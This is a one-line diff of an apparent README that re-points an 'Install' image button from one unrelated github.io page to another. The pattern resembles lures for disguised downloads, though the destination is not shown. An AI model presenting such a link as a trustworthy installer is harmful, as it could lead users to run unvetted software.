@@ -6,7 +6,7 @@
 
 <p align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://samara-apes.github.io/.github/ipartition)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://norm-apps.github.io/.github/ipartition)
 
 </p>
 
